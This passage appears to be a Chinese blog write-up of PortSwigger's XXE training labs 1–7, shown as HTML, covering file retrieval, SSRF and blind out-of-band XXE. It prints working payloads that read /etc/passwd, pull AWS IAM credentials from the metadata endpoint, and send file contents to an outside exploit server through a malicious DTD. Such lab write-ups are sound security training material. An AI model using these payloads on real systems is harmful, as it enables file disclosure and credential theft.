@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="1 Lab: Exploiting XXE using external entities to retrieve files查库存功能使用 XML 传输数据。 通过 post 方法传递参数 productId 和 storeId 获取库存信息。  修改请求报文消息体，注入 xxe，即 XML 外部实体 123456&lt;?xml version&#x3D;&quot;1.0&quot; encoding">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PortSwigger XXEi labs">
+<meta property="og:url" content="https://by-musi.github.io/2024/07/09/PortSwigger_XXEi_labs/index.html">
+<meta property="og:site_name" content="OhMyDarkSpace">
+<meta property="og:description" content="1 Lab: Exploiting XXE using external entities to retrieve files查库存功能使用 XML 传输数据。 通过 post 方法传递参数 productId 和 storeId 获取库存信息。  修改请求报文消息体，注入 xxe，即 XML 外部实体 123456&lt;?xml version&#x3D;&quot;1.0&quot; encoding">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703151347.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703151733.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703153608.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703153845.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703154854.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703154944.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703155104.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240704083338.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240704084321.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240704084751.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705084020.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705084352.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705084700.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705085304.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705085700.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705090018.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705090036.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705113204.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705114509.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705114639.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705153642.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705154233.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705155757.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705160322.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705171537.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240705174009.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707103406.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707105034.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707110015.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707110343.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707110403.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707111025.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707111442.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707112456.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707114528.png">
+<meta property="og:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240707114721.png">
+<meta property="article:published_time" content="2024-07-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-09T13:59:47.477Z">
+<meta property="article:author" content="CaiShao">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="xxe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://by-musi.github.io/images/2024/07/09/Pasted_image_20240703151347.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PortSwigger XXEi labs</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+  <!-- fancybox -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="OhMyDarkSpace" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="OhMyDarkSpace" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/07/09/PortSwigger_GraphQL_labs/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/06/06/%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6-SSRF+DNS_rebinding%E3%80%90$5000%E3%80%91/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://by-musi.github.io/2024/07/09/PortSwigger_XXEi_labs/&title=PortSwigger XXEi labs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Lab-Exploiting-XXE-using-external-entities-to-retrieve-files"><span class="toc-number">1.</span> <span class="toc-text">1 Lab: Exploiting XXE using external entities to retrieve files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Lab-Exploiting-XXE-to-perform-SSRF-attacks"><span class="toc-number">2.</span> <span class="toc-text">2 Lab: Exploiting XXE to perform SSRF attacks</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Lab-Exploiting-XInclude-to-retrieve-files"><span class="toc-number">3.</span> <span class="toc-text">3 Lab: Exploiting XInclude to retrieve files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Lab-Blind-XXE-with-out-of-band-interaction"><span class="toc-number">4.</span> <span class="toc-text">4 Lab: Blind XXE with out-of-band interaction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Lab-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities"><span class="toc-number">5.</span> <span class="toc-text">5 Lab: Blind XXE with out-of-band interaction via XML parameter entities</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD"><span class="toc-number">6.</span> <span class="toc-text">6 Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages"><span class="toc-number">7.</span> <span class="toc-text">7 Lab: Exploiting blind XXE to retrieve data via error messages</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-expert-Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD"><span class="toc-number">8.</span> <span class="toc-text">8 (expert) Lab: Exploiting XXE to retrieve data by repurposing a local DTD</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-Lab-Exploiting-XXE-via-image-file-upload"><span class="toc-number">9.</span> <span class="toc-text">9 Lab: Exploiting XXE via image file upload</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PortSwigger XXEi labs
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">CaiShao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-08T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-07-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>, <a class="p-category" href="/tags/xxe/" rel="tag">xxe</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="1-Lab-Exploiting-XXE-using-external-entities-to-retrieve-files"><a href="#1-Lab-Exploiting-XXE-using-external-entities-to-retrieve-files" class="headerlink" title="1 Lab: Exploiting XXE using external entities to retrieve files"></a>1 Lab: Exploiting XXE using external entities to retrieve files</h1><p>查库存功能使用 XML 传输数据。 通过 post 方法传递参数 <code>productId</code> 和 <code>storeId</code> 获取库存信息。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240703151347.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240703151347.png"></a></p>
+<p>修改请求报文消息体，注入 xxe，即 XML 外部实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应报文成功读取到 <code>/etc/passwd</code> 文件。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240703151733.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240703151733.png"></a></p>
+<p>由此可见 XXE 注入需要两步：</p>
+<ol>
+<li>在 DOCTYPE 中定义一个访问敏感信息或其它 url 的外部实体；</li>
+<li>在 XML 中调用。</li>
+</ol>
+<h1 id="2-Lab-Exploiting-XXE-to-perform-SSRF-attacks"><a href="#2-Lab-Exploiting-XXE-to-perform-SSRF-attacks" class="headerlink" title="2 Lab: Exploiting XXE to perform SSRF attacks"></a>2 Lab: Exploiting XXE to perform SSRF attacks</h1><p>题干内容：</p>
+<ol>
+<li>“Check stock” 模块使用 XML 格式传输数据。</li>
+<li>服务端运行着一个 AWS EC2 server，可以使用 <code>http://169.254.169.254/</code> 访问敏感信息。</li>
+<li>结合 SSRF obtains the server’s IAM secret access key from the EC2 metadata endpoint。SSRF 内容参见 [[SSRF 基础介绍]]</li>
+</ol>
+<p>burp 抓包，重放，注入 xxe，直接访问 <code>http://169.254.169.254/</code>。响应没啥东西，说明访问的 url 不对。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240703153608.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240703153608.png"></a></p>
+<p>借助之前阅读漏洞报告积累的经验，AWS 的敏感信息有云端元数据信息，enpoint 是 <code>/latest/meta-data/</code>。响应仍然没啥东西，但是返回内容为 iam，与题干让我们获取 iam key 相关。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240703153845.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240703153845.png"></a></p>
+<p>查阅<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/41024362/aws-retrieving-security-credentials-from-instance-metadata">资料</a>发现，获取 AWS 实例敏感信息访问的 endpoint 类似：<code>http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access</code>，于是我觉得响应的内容 iam 可能是目录名？</p>
+<p>修改 url 一步步获取到对应的敏感信息 key。</p>
+<p><code>http://169.254.169.254/latest/meta-data/iam</code></p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240703154854.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240703154854.png"></a></p>
+<p><code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code></p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240703154944.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240703154944.png"></a></p>
+<p><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</code></p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240703155104.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240703155104.png"></a></p>
+<h1 id="3-Lab-Exploiting-XInclude-to-retrieve-files"><a href="#3-Lab-Exploiting-XInclude-to-retrieve-files" class="headerlink" title="3 Lab: Exploiting XInclude to retrieve files"></a>3 Lab: Exploiting XInclude to retrieve files</h1><p>–&gt; <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">传送门</a></p>
+<p>还是读取库存模块使用了 XML 格式传输数据。根据题干，我们貌似无法定义 DTD，但可以注入 <code>XInclude</code> 表达式发起 XXE 注入攻击，获取敏感信息。</p>
+<p>burp 抓包发现传输的数据格式是 <code>application/x-www-form-urlencoded</code>.</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240704083338.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240704083338.png"></a></p>
+<p>通过分析报文历史，找到了两个与查看库存相关的文件：</p>
+<ol>
+<li>stockCheck.js</li>
+<li>stockCheckPayload.js<br>stockCheck.js 将 Content-Type 设置成了 window.contentType，(<code>headers: &#123; &#39;Content-Type&#39;: window.contentType &#125;</code>)，而 Content-Type 在 stockCheckPayload.js 中定义，其值为 <code>application/x-www-form-urlencoded</code>。相当于是默认属性。</li>
+</ol>
+<p>stockCheck.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;stockCheckForm&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title function_">checkStock</span>(<span class="variable language_">this</span>.<span class="title function_">getAttribute</span>(<span class="string">&quot;method&quot;</span>), <span class="variable language_">this</span>.<span class="title function_">getAttribute</span>(<span class="string">&quot;action&quot;</span>), <span class="keyword">new</span> <span class="title class_">FormData</span>(<span class="variable language_">this</span>));</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkStock</span>(<span class="params">method, path, data</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">retry</span> = (<span class="params">tries</span>) =&gt; tries == <span class="number">0</span></span><br><span class="line">        ? <span class="literal">null</span></span><br><span class="line">        : <span class="title function_">fetch</span>(</span><br><span class="line">            path,</span><br><span class="line">            &#123;</span><br><span class="line">                method,</span><br><span class="line">                <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="variable language_">window</span>.<span class="property">contentType</span> &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title function_">payload</span>(data)</span><br><span class="line">            &#125;</span><br><span class="line">          )</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="property">status</span> === <span class="number">200</span></span><br><span class="line">                ? res.<span class="title function_">text</span>().<span class="title function_">then</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="built_in">isNaN</span>(t) ? t : t + <span class="string">&quot; units&quot;</span>)</span><br><span class="line">                : <span class="string">&quot;Could not fetch stock levels!&quot;</span></span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;stockCheckResult&quot;</span>).<span class="property">innerHTML</span> = res)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">retry</span>(tries - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_">retry</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>stockCheckPayload.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">contentType</span> = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">payload</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(data).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接修改 Content-Type 为 xml，发现并未奏效。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240704084321.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240704084321.png"></a></p>
+<p>根据题意，服务端可能将用户的输入在服务端放入了一个 XML 文档中，这个 XML 会在之后解析并将内容回显给客户端。</p>
+<p>payload: <code>productId=%3Cfoo%20xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E%3C/foo%3E&amp;storeId=1</code></p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240704084751.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240704084751.png"></a></p>
+<h1 id="4-Lab-Blind-XXE-with-out-of-band-interaction"><a href="#4-Lab-Blind-XXE-with-out-of-band-interaction" class="headerlink" title="4 Lab: Blind XXE with out-of-band interaction"></a>4 Lab: Blind XXE with out-of-band interaction</h1><p>burp 抓包，注入 xxe，响应并没有像 lab 1 一样显示出 <code>/etc/passwd</code> 的内容。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705084020.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705084020.png"></a></p>
+<p>根据题干，尝试 Blind XXE 注入。首先在 Collaborator 中创建一个 out-of-band 服务器，将链接加入到 XXE 中。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705084352.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705084352.png"></a></p>
+<p>Collaborator 已经收到了对应的 http 请求，lab 解决。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705084700.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705084700.png"></a></p>
+<h1 id="5-Lab-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities"><a href="#5-Lab-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities" class="headerlink" title="5 Lab: Blind XXE with out-of-band interaction via XML parameter entities"></a>5 Lab: Blind XXE with out-of-band interaction via XML parameter entities</h1><p>根据题干，这道题也是 Blind XXE 注入。</p>
+<p>构造好 payload 发送后，响应提示 “Entities are not allowed for security reasons”，外部实体没法用。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705085304.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705085304.png"></a></p>
+<p>这种情况下可以使用 XML 参数实体，使用百分号（%） <code>%xxe;</code> 调用参数实体。payload 如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://pohcrjcs6ddfnzal92onpy83suylmda2.oastify.com&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705085700.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705085700.png"></a></p>
+<p>虽然响应报了个 XML 解析错误，但是 Collaborator 仍然获取到了 DNS 解析和 HTTP 请求记录。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705090018.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705090018.png"></a></p>
+<p>收工。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705090036.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705090036.png"></a></p>
+<h1 id="6-Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD"><a href="#6-Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD" class="headerlink" title="6 Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD"></a>6 Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</h1><p>在 exploit server 设置创建一个名为 malicious.dtd 的 DTD 文件，写入 payload.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;https://exploit-0a7f00f50443ee85809c5c0201c700a4.exploit-server.net/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
+
+<p>直接注入 xxe 报错，”Entities are not allowed for security reasons”。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705113204.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705113204.png"></a></p>
+<p>尝试注入参数实体。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705114509.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705114509.png"></a></p>
+<p>服务端貌似并没有收到 <code>/etc/passwd</code> 的内容？</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705114639.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705114639.png"></a></p>
+<p>我傻逼了，应该请求 <code>/etc/hostname</code>。再次发送报文，查看日志发现有一条 GET 请求 <code>/exploit/malicioud.dtd</code> 的记录，但是没有进一步发送 <code>/etc/hostname</code> 的内容。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705153642.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705153642.png"></a></p>
+<p>调试了半天终于可以了。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705154233.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705154233.png"></a></p>
+<blockquote>
+<p>[!question] payload 里面的 % 还必须写成 <code>&amp;#x25;</code>？我直接加 % 没法拿到数据。还有 <code>eval</code> 后面不需要加 SYSTEM 嘛？</p>
+</blockquote>
+<h1 id="7-Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages"><a href="#7-Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages" class="headerlink" title="7 Lab: Exploiting blind XXE to retrieve data via error messages"></a>7 Lab: Exploiting blind XXE to retrieve data via error messages</h1><p>在 exploit server 中写入上一个 lab 中的 payload，发送报文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;https://exploit-0a5c000204fa1eb8818e51ba0168003f.exploit-server.net/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
+
+<p>报了个这个错，没看明白。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705155757.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705155757.png"></a></p>
+<p>原来是 <code>&lt;!DOCTYPE</code> 后面没写名字，emmm，看来得好好研究下 XML 语法了。</p>
+<p>再次发包，仍然使用上一个 lab 的 payload。响应报文报错：”XML parser exited with error: java.net.MalformedURLException: Illegal character in URL”。</p>
+<p>猜测应该是 URL <code>.../?x=%file;</code> 中的 % 的原因，将其修改成 &#x25; 后发送，响应仍然报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;XML parser exited with error: org.xml.sax.SAXParseException; systemId: https://exploit-0a5c000204fa1eb8818e51ba0168003f.exploit-server.net/?x=%file;; lineNumber: 1; columnNumber: 3; The markup declarations contained or pointed to by the document type declaration must be well-formed.&quot;</span><br></pre></td></tr></table></figure>
+
